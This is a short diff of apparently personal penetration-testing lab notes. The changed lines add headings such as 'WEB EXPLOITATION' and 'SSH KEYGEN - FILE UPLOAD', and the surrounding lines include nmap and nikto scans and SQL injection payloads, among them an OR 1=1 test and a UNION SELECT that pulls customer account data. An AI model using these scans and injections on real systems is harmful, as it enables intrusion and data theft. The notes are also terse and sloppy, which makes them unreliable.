@@ -47,7 +47,7 @@ nmap -Pn -T4 (-n) --min-rate 8888888888888 10.50.29.198 -p 80 --script http-enum
 nmap --script http-enum 
 /login
 /script
-
+check /robots.txt _________________________________________________________________________
 if i use nikto proxychains redirect to 2>/dev/null
 nikto -h ip 
 might not work
@@ -98,7 +98,7 @@ check if ssh creds work
 -------------------
 
 
-PRODUCT SELECTION
+PRODUCT SELECTION / WEB EXPLOITATION
 
 look for tables and colmuns
 test product=1 OR 1=1; #
@@ -117,6 +117,13 @@ siteusers  |   customer  |  name
 
 
 product=7 UNION SELECT name,description,account FROM siteusers.customer;
+
+``````````````````````````````````````````````````````````````````````````````````
+SSH KEYGEN - FILE UPLOAD
+
+
+
+
 ============================================================================
 
 BANNER GRABBING KEY STEPPPPPPPPPPPPPPPPPPPPPp
